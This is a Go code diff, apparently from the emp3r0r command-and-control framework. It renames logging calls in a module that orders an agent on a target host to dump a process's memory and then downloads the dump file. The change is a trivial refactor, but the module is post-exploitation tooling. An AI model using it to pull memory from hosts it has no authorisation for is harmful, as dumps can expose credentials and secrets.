@@ -15,17 +15,17 @@ import (
 func moduleMemDump() {
 	pidOpt, ok := CurrentModuleOptions["pid"]
 	if !ok {
-		CliPrintError("Option 'pid' not found")
+		LogError("Option 'pid' not found")
 		return
 	}
 	cmd := fmt.Sprintf("%s --pid %s", emp3r0r_def.C2CmdMemDump, pidOpt.Val)
 	cmd_id := uuid.NewString()
 	err := SendCmd(cmd, cmd_id, CurrentTarget)
 	if err != nil {
-		CliPrintError("SendCmd: %v", err)
+		LogError("SendCmd: %v", err)
 		return
 	}
-	CliPrint("Please wait for agent's response...")
+	LogMsg("Please wait for agent's response...")
 
 	var cmd_res string
 	for i := 0; i < 100; i++ {
@@ -42,13 +42,13 @@ func moduleMemDump() {
 	}
 	path := cmd_res
 	if path == "" || strings.HasPrefix(path, "Error") {
-		CliPrintError("Failed to get memdump file path: invalid response")
+		LogError("Failed to get memdump file path: invalid response")
 		return
 	}
 
 	_, err = GetFile(path, CurrentTarget)
 	if err != nil {
-		CliPrintError("GetFile: %v", err)
+		LogError("GetFile: %v", err)
 		return
 	}
 }
